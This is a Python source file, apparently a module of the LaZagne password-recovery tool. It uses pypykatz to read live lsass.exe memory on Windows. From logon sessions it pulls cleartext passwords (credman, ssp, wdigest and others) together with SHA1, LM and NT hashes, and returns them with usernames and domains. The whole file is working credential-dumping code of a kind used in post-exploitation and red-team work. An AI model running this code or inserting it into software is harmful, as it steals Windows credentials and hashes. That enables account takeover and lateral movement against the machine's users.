# -*- coding: utf-8 -*-

# Thanks to @skelsec for his awesome tool Pypykatz
# Checks his project here: https://github.com/skelsec/pypykatz

import codecs
import traceback

from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
from pypykatz.pypykatz import pypykatz


class Pypykatz(ModuleInfo):
    """
    Pypykatz dumps all secrets from the lsass.exe memory
    It does not work if:
    - LSASS is running as a protected process
    - A security product blocks this access
    """

    def __init__(self):
        ModuleInfo.__init__(self, 'pypykatz', 'windows', system_module=True)

    def run(self):
        mimi = None
        try:
            mimi = pypykatz.go_live()
        except Exception:
            self.debug(traceback.format_exc())

        if mimi:
            results = {}
            logon_sessions = mimi.to_dict().get('logon_sessions', [])
            for logon_session in logon_sessions:

                # Right now kerberos_creds, dpapi_creds results are not used
                user = logon_sessions[logon_session]

                # Get cleartext password
                for i in ['credman_creds', 'ssp_creds', 'livessp_creds', 'tspkg_creds', 'wdigest_creds']:
                    for data in user.get(i, []):
                        if all((data['username'], data['password'])):
                            login = data['username']
                            if login not in results:
                                results[login] = {}

                            results[login]['Type'] = i
                            results[login]['Domain'] = data.get('domainname', 'N/A')
                            results[login]['Password'] = data['password']

                # msv_creds to get sha1 user hash
                for data in user.get('msv_creds', []):
                    if data['username']:
                        login = data['username']
                    else:
                        login = user['username']

                    if login not in results:
                        results[login] = {}

                    if data['SHAHash']:
                        results[login]['Shahash'] = codecs.encode(data['SHAHash'], 'hex')
                    if data['LMHash']:
                        results[login]['Lmhash'] = codecs.encode(data['LMHash'], 'hex')
                    if data['NThash']:
                        results[login]['Nthash'] = codecs.encode(data['NThash'], 'hex')

            constant.pypykatz_result = results
            pwd_found = []
            for user in results:
                results[user]['Login'] = user
                pwd_found.append(results[user])

            return pwd_found
